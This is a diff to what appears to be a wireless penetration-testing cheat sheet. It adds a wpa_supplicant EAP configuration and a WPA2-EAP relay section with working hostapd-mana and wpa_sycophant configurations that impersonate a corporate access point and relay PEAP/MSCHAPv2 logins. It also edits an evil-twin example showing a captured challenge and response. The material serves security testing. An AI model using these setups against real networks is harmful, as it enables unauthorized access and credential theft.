@@ -61,6 +61,7 @@
       - [Key Reinstallation Attack (KRACK)](#key-reinstallation-attack-krack)
       - [FRAG Attack](#frag-attack)
     - [WPA2 Enterprise](#wpa2-enterprise)
+    - [wpa_supplicant and EAP](#wpa_supplicant-and-eap)
     - [EAP Types](#eap-types)
       - [EAP-MD5](#eap-md5)
       - [EAP-PAP](#eap-pap)
@@ -725,6 +726,27 @@ KRAKC attack or Key Reinstallation Attack
 
 <img src="./images/eap.png" width="700"/>
 
+### wpa_supplicant and EAP
+
+Authenticate to WPA EAP network using wpa_supplicant
+```
+wpa_supplicant -i wlan0 -c ./wpa_supplicant.conf
+```
+
+wpa_supplicant.conf
+```
+network={
+  ssid="YOUR_SSID"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  identity="YOUR_USERNAME"
+  password="YOUR_PASSWORD"
+  eap=PEAP
+  phase1="peaplabel=0"
+  phase2="auth=MSCHAPV2"
+}
+```
+
 ### EAP Types
 EAP is an authentication framework that defines the transport and usage of identity credentials. EAP encapsulates the usernames, passwords, certificates, tokens, OTPs, etc. that a client is sending for purposes of authentication.  
 
@@ -858,7 +880,6 @@ Inner authentication:
 - https://mikeallen.org/blog/2016-10-06-breaking-into-wpa-enterprise-networks-with-air-hammer/
 
 #### WPA2-EAP Evil Twin Attack
-
 ##### Hostapd-WPE (Previously FreeRadius WPE)
 - https://github.com/OpenSecurityResearch/hostapd-wpe
 - https://www.c0d3xpl0it.com/2017/03/enterprise-wifi-hacking-with-hostapd-wpe.html
@@ -877,7 +898,7 @@ apt install hostadp-wpe
 ifconfig wlan1 down
 hostapd-wpe ./evilhostapd.conf
 
-username: jdslfkjs
+username: jdoe
     challenge: bc:87:6c:48:37:d3:92:6e
     response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0
 ```
@@ -935,6 +956,77 @@ asleap -C 06:9b:40:83:37:90:fd:41 -R 27:63:33:83:e7:25:98:5e:6d:4f:ed:73:b9:c5:1
 ```
 
 #### WPA2-EAP Relay
+- https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/
+- https://sensepost.com/blog/2019/understanding-peap-in-depth/
+- https://github.com/sensepost/wpa_sycophant
+- https://www.youtube.com/watch?v=eYsGyvGxlpI
+
+--> This attack need at least 2 interfaces (and 3 in case of deauthentication frame to be sent).  
+
+1. Mana will pretend to be corporate AP
+2. Supplicant (wpa_sycophant) retrieving the required information from mana to connect to the legitimate corporate AP.
+
+<img src="./images/peap_relay.png" width="700"/>
+
+Running hostapd-mana
+```
+hostapd-mana hostapd.conf | grep 'SYCOPHANT\|MANA'
+```
+
+hostapd.conf file
+```
+interface=wlan0
+ssid=CorpoSSID
+channel=6
+hw_mode=g
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+auth_algs=3
+ieee8021x=1
+eapol_key_index_workaround=0
+eap_server=1
+eap_user_file=/root/certs/hostapd.eap_user
+ca_cert=/root/certs/server.pem
+server_cert=/root/certs/server.pem
+private_key=/root/certs/server.key
+private_key_passwd=
+dh_file=/root/certs/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+enable_mana=1
+enable_sycophant=1
+sycophant_dir=/tmp/
+```
+
+Launching wpa_sycophant
+```
+./wpa_sycophant.sh -c wpa_sycophant.conf -i wlan1
+```
+
+wpa_sycophant.conf (bssid_blacklist = MAC of your fake hostapd AP)
+```
+network={
+  ssid="TestingEAP"
+  # The SSID you would like to relay and authenticate against. 
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  # Do not modify
+  identity=""
+  anonymous_identity=""
+  password=""
+  # This initialises the variables for me.
+  # -------------
+  eap=PEAP
+  # Read https://w1.fi/cgit/hostap/plain/wpa_supplicant/wpa_supplicant.conf for help with phase1 options. 
+  # This attempts to force the client not use cryptobinding. 
+  phase1="crypto_binding=0 peapver=0"
+  phase2="auth=MSCHAPV2"
+  # Dont want to connect back to ourselves,
+  # so add your rogue BSSID here.
+  bssid_blacklist=00:14:22:01:23:45
+}
+```
 
 ## WPA3
 The major improvement of WPA3 is a improved handshake (*Dragonfly-Handshake*) that makes it impossible for attackers to record the *4-Way Handshake* and launch a offline dictionary attack.  
